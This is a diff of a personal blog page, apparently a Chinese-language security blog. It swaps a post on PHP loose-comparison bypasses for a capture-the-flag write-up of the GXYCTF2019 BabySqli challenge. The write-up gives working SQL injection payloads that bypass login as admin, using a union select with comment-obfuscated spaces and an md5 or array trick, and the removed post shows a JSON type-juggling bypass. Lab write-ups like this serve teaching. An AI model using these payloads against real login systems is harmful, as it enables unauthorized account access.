@@ -6,15 +6,16 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>php弱类型绕过 | Antel0p3&#39;s blog</title>
+  <title>GXYCTF2019-BabySqli-wp | Antel0p3&#39;s blog</title>
   <meta name="author" content="John Doe">
   
-  <meta name="description" content="php弱类型绕过12345678910&amp;#x27;&amp;#x27; == 0 == false&amp;#x27;123&amp;#x27; == 123&amp;#x27;abc&amp;#x27; == 0&amp;#x27;123a&amp;#x27; == 123&amp;#x27;0x01&amp;#x27; == 1&amp;#x27;0e12346789&amp;#x">
+  <meta name="description" content="源码查看页面源码看到字符串  MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
+base32+base64解密后得到 select * from user ">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="php弱类型绕过"/>
+  <meta property="og:title" content="GXYCTF2019-BabySqli-wp"/>
   <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
 
   
@@ -111,13 +112,13 @@
 								<h1>
 									
 											
-												php弱类型绕过
+												GXYCTF2019-BabySqli-wp
 									
 									
 								</h1>
 								
-									<p id="/2023/07/03/php-weakcmp/" class="leancloud-visitors view"
-										data-flag-title="php弱类型绕过">
+									<p id="/2023/07/16/GXYCTF2019-BabySqli-wp/" class="leancloud-visitors view"
+										data-flag-title="GXYCTF2019-BabySqli-wp">
 										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 									</p>
 									
@@ -138,24 +139,17 @@
 	<div class="mypage">		
 	  		
 
-	  <h2 id="php弱类型绕过"><a href="#php弱类型绕过" class="headerlink" title="php弱类型绕过"></a>php弱类型绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span> == <span class="literal">false</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> == <span class="number">123</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> == <span class="number">0</span></span><br><span class="line"><span class="string">&#x27;123a&#x27;</span> == <span class="number">123</span></span><br><span class="line"><span class="string">&#x27;0x01&#x27;</span> == <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;0e12346789&#x27;</span> == <span class="string">&#x27;0e987654321&#x27;</span>	（都解释为<span class="number">0</span>）</span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line"><span class="literal">true</span> == <span class="number">1</span></span><br><span class="line"><span class="literal">true</span> == <span class="string">&quot;***&quot;</span>	(<span class="literal">true</span>和任意字符串弱相等)</span><br></pre></td></tr></table></figure>
+	  <h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>查看页面源码看到字符串  MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+<p>base32+base64解密后得到 <code>select * from user where username = &#39;$name&#39;</code></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>登录  用户名只能为admin  发现name字段可以替换空格注入  但信息无回显</p>
+<p>可以联合注入3个字段  经尝试发现第二个字段为用户名  使其为admin即可   </p>
+<p>尝试密码传数组得到warning：<code>Warning: md5() expects parameter 1 to be string, array given in /var/www/html/search.php on line 27</code></p>
+<p>猜测判断逻辑应该为 将数据库中取出的password和md5($pw)比较</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin<span class="string">&#x27;/**/union/**/select/**/1,&#x27;</span>admin<span class="string">&#x27;,NULL/**/limit/**/1,1%23&amp;pw[]=1</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a target="_blank" rel="noopener" href="http://a.y1ng.vip:1126/secretjson/">secretjson</a><br>页面源码  </p>
-<pre><code class="php">&lt;?php
-include_once &#39;secret.php&#39;; // $flag  $key
-if (isset($_POST[&#39;message&#39;])) &#123;
-    $message = json_decode($_POST[&#39;message&#39;]);
-    if ($message-&gt;key == $key) &#123;
-        echo $flag;
-    &#125; 
-    else &#123;
-        echo &quot;fail&quot;;
-    &#125;
-&#125;
-else show_source(__FILE__);
-?&gt;
-</code></pre>
-<p>post –&gt; message&#x3D;{“key”:true} 即可获取flag</p>
+<p>或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=admin<span class="string">&#x27;/**/union/**/select/**/1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">0</span>cc175b9c0f1b6a831c399e269772661<span class="string">&#x27;/**/limit/**/1,1%23&amp;pw=a</span></span><br><span class="line"><span class="string">// 0cc175b9c0f1b6a831c399e269772661 == md5(&#x27;</span>a<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
 
 	  <div class="article-footer-copyright">
 
@@ -165,7 +159,7 @@ else show_source(__FILE__);
 	</div>
 
 	<!-- 
-		<span id="/2023/07/03/php-weakcmp/" class="leancloud-visitors view" data-flag-title="php弱类型绕过">
+		<span id="/2023/07/16/GXYCTF2019-BabySqli-wp/" class="leancloud-visitors view" data-flag-title="GXYCTF2019-BabySqli-wp">
 			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 		</span>
 	 -->
@@ -177,13 +171,12 @@ else show_source(__FILE__);
 
     
     
-    <a href="/2023/07/05/SWPUCTF2021-ezsql-wp/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/06/28/CVE-2017-11543复现-1/" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/07/16/web-upload-labs/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -242,7 +235,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-07-03 
+	2023-07-16 
 	</div>
 	
 
@@ -253,7 +246,7 @@ new Valine(valineConfig);
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/web-learning/">web-learning<span>2</span></a></li>
+    <li><a href="/categories/web-wp/">web-wp<span>17</span></a></li>
   </li>
 
     </ul>
@@ -266,7 +259,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>32</span></a></li> <li><a href="/tags/web/">web<span>19</span></a></li> <li><a href="/tags/php/">php<span>10</span></a></li>
+  <li><a href="/tags/CTF/">CTF<span>32</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>25</span></a></li> <li><a href="/tags/web/">web<span>19</span></a></li> <li><a href="/tags/sql/">sql<span>7</span></a></li> <li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
     </ul>
 	</div>
 		
